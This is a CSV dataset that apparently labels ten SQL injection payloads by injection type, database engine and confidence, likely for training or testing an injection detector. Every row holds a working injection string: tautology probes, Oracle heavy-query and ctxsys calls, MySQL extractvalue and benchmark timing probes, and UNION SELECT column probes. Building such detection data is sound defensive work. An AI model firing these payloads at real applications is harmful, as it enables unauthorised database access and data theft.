id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
1,1' ) where 4949 = 4949,boolean_blind,generic,0.95,Boolean logic pattern 'where 4949 = 4949' detected for blind inference or tautology,2
2,"1"" ) ) as sqow where 8752 = 8752",boolean_blind,generic,0.95,Boolean logic pattern 'where 8752 = 8752' detected for blind inference or tautology,2
3,"1 ) where 8008 = 8008 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,oracle,0.95,Boolean logic pattern 'where 8008 = 8008 ' detected for blind inference or tautology,3
4,"1"" ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,0.95,'extractvalue'/'updatexml' XPath error tokens detected (MySQL signature),2
5,"1"" ) as frmp where 6073 = 6073",boolean_blind,generic,0.95,Boolean logic pattern 'where 6073 = 6073' detected for blind inference or tautology,2
6,"1"" procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 )",error_based,mysql,0.95,'extractvalue'/'updatexml' XPath error tokens detected (MySQL signature),2
7,-2411 or ( 8459 = 8459 ) *4906# pxwg,boolean_blind,generic,0.95,Boolean logic pattern 'or ( 8459 = 8459 )' detected for blind inference or tautology,2
8,"1"" and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",boolean_blind,oracle,0.95,Boolean logic pattern 'and 6055 = ctxsys' detected for blind inference or tautology,1
9,"1%"" union all select null,null,null--",union_based,generic,0.95,"UNION SELECT pattern detected in '1%"" union all select null,null...' for data exfiltration",3
10,"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--",union_based,generic,0.95,"UNION SELECT pattern detected in '-7337"" union all select 7294,7...' for data exfiltration",3
